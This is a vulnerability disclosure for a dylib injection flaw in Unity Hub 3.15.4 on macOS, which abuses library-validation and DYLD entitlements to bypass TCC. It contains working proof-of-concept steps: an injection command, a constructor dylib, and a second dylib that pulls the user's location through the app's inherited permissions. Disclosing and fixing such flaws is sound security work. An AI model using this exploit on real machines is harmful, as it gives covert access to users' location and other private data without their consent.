# Unity Hub macOS - Dylib Injection / TCC Bypass

## Summary

A dylib injection vulnerability exists in Unity Hub 3.15.4 for macOS that allows attackers to bypass TCC (Transparency, Consent, and Control) and inherit the application's permissions, including access to microphone, camera, location, photos, contacts, and calendar.

---

## Affected Product

- **Application:** Unity Hub
- **Version:** 3.15.4
- **Platform:** macOS

---

## Vulnerability Description

Unity Hub 3.15.4 for macOS contains insecure code signing entitlements that allow attackers to load malicious libraries into the application. The app is signed with `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` both set to true, enabling arbitrary code injection via the `DYLD_INSERT_LIBRARIES` environment variable.

---

## Attack Vector

An attacker with local access must execute Unity Hub with a malicious dylib using the `DYLD_INSERT_LIBRARIES` environment variable.

---

## Vulnerable Entitlements

```
com.apple.security.cs.disable-library-validation = true
com.apple.security.cs.allow-dyld-environment-variables = true
```

## Inherited Permissions (TCC Bypass)

| Entitlement | Access Granted |
|-------------|----------------|
| `com.apple.security.device.audio-input` | Microphone |
| `com.apple.security.device.camera` | Camera |
| `com.apple.security.personal-information.location` | Location |
| `com.apple.security.personal-information.photos-library` | Photos |
| `com.apple.security.personal-information.addressbook` | Contacts |
| `com.apple.security.personal-information.calendars` | Calendar |
| `com.apple.security.automation.apple-events` | Apple Events |

---

## Proof of Concept

### 1. Verify Entitlements

```bash
codesign -dvv --entitlements - /Applications/Unity\ Hub.app
```

### 2. Create Malicious Dylib

```objc
#import <Foundation/Foundation.h>

__attribute__((constructor))
static void malicious() {
    NSLog(@"[+] Malicious dylib loaded! Process: %s", getprogname());
}
```

Compile:
```bash
clang -dynamiclib -framework Foundation malicious.m -o malicious.dylib
```

### 3. Execute Injection

```bash
DYLD_INSERT_LIBRARIES=malicious.dylib /Applications/Unity\ Hub.app/Contents/MacOS/Unity\ Hub
```

### 4. Output

```
2025-12-21 15:09:10.958 Unity Hub[10800:259833] [+] Malicious dylib loaded! Process: Unity Hub
2025-12-21 15:09:13.339 Unity Hub Helper (GPU)[10803:259945] [+] Malicious dylib loaded! Process: Unity Hub Helper (GPU)
2025-12-21 15:09:13.356 Unity Hub Helper[10804:259951] [+] Malicious dylib loaded! Process: Unity Hub Helper
```

---

## Location Extraction PoC

### Dylib Code

```objc
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationFetcher : NSObject <CLLocationManagerDelegate>
@property (strong, nonatomic) CLLocationManager *locationManager;
- (void)startFetchingLocation;
- (void)stopFetchingLocation;
@end

@implementation LocationFetcher

- (instancetype)init {
    self = [super init];
    if (self) {
        _locationManager = [[CLLocationManager alloc] init];
        _locationManager.delegate = self;
        [_locationManager requestAlwaysAuthorization];
    }
    return self;
}

- (void)startFetchingLocation {
    [self.locationManager startUpdatingLocation];
    NSLog(@"Location fetching started");
}

- (void)stopFetchingLocation {
    [self.locationManager stopUpdatingLocation];
    NSLog(@"Location fetching stopped");
}

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *latestLocation = [locations lastObject];
    NSLog(@"Location: Latitude: %f, Longitude: %f",
          latestLocation.coordinate.latitude,
          latestLocation.coordinate.longitude);
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    NSLog(@"Location fetching failed: %@", [error localizedDescription]);
}

@end

__attribute__((constructor))
static void exploit() {
    LocationFetcher *fetcher = [[LocationFetcher alloc] init];
    [fetcher startFetchingLocation];
    [NSThread sleepForTimeInterval:5.0];
    [fetcher stopFetchingLocation];
}
```

### Compile

```bash
gcc -dynamiclib -framework Foundation -framework CoreLocation location.m -o location.dylib
```

### Output

```
2025-12-21 15:11:21.963 Unity Hub[10958:263464] Location fetching started
2025-12-21 15:11:26.968 Unity Hub[10958:263464] Location fetching stopped
2025-12-21 15:11:26.968 Unity Hub[10958:263464] Location: Latitude: X.XXXXXX, Longitude: XXX.XXXXXX
```

---

## Impact

An attacker can execute arbitrary code within Unity Hub's context and access sensitive user data without triggering additional permission prompts.

---

## Remediation

Remove or restrict the following entitlements:
- `com.apple.security.cs.disable-library-validation`
- `com.apple.security.cs.allow-dyld-environment-variables`

---

## Credit

Zeyad Azima

---

## References

- https://zeyadazima.com/MacOS/
